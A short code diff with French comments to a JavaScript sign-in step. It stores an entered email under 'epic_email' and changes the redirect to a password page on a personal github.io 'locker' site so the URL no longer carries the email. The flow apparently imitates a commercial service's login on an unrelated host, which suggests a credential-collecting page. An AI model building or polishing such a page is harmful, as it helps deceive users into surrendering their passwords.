@@ -506,7 +506,7 @@
 
   if (!emailInput || !errorEl) return;
 
-  /* URL de la page de mot de passe */
+  /* URL propre de la page de mot de passe (sans paramètre) */
   const PASSWORD_PAGE_URL = 'https://hesskahmdl.github.io/locker/login.html/passwords.html';
 
   function isValidEmail(value) {
@@ -575,8 +575,8 @@
       localStorage.setItem('epic_email', value);
     } catch (err) { /* ignore */ }
 
-    /* Redirection vers la page de mot de passe avec l'email en paramètre */
-    window.location.href = PASSWORD_PAGE_URL + '?email=' + encodeURIComponent(value);
+    /* Redirection vers l'URL PROPRE (sans paramètre) */
+    window.location.href = PASSWORD_PAGE_URL;
   });
 
   /* Permet aussi de valider avec la touche Entrée */
